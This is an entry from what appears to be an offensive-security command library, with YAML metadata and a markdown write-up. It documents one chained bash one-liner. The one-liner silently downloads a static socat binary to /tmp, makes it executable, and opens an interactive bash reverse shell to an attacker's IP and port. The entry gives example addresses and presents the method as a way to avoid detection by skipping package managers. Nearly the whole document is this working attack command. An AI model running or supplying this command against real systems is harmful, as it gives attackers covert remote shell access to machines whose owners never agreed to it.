---
id: f05f5e68-fc6f-47ac-8af3-01c882fdcbbb
name: download-and-execute-socat-reverse-shell
type: command
executor: bash
data: >-
  wget -q
  https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
  -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash
  -li',pty,stderr,setsid,sigint,sane tcp:$_ATTACKER_IP:$_PORT
output: null
created_at: '2023-04-06T03:56:24.199253+00:00'
updated_at: '2023-04-10T20:25:32.757798+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - download
  - socat
verified: true
validated: true
---

# download-and-execute-socat-reverse-shell

## Command

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$_ATTACKER_IP:$_PORT
```

## Description

This chained command downloads a static Socat binary for Linux x86_64 from a GitHub repository, makes it executable, and immediately uses it to establish a reverse shell to the attacker. It's useful in environments where Socat isn't pre-installed, minimizing detection by avoiding package managers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker machine | Yes |
| $_PORT | Port on which the attacker is listening | Yes |
| -q | Quiet mode for wget (suppresses output) | Built-in |
| -O /tmp/socat | Specifies output file path | Built-in |
| chmod +x | Sets execute permissions on the binary | Built-in |
| exec:'bash -li',pty,stderr,setsid,sigint,sane | Spawns interactive Bash with PTY and signal handling | Built-in |
| tcp | TCP connection type | Built-in |

## Examples

### Basic Usage

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

### Advanced Usage

Customize IP/port:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.100:4444
```

## Expected Output

Silent on success (due to -q); the binary downloads (~1MB), executes, and connects. Attacker sees shell prompt upon connection. If download fails, wget errors appear; check with 'ls -la /tmp/socat' post-run.

## Related

- [[procedures/Establish-Reverse-Shell-Using-Socat]]
- [[commands/socat-victim-connect-installed]]
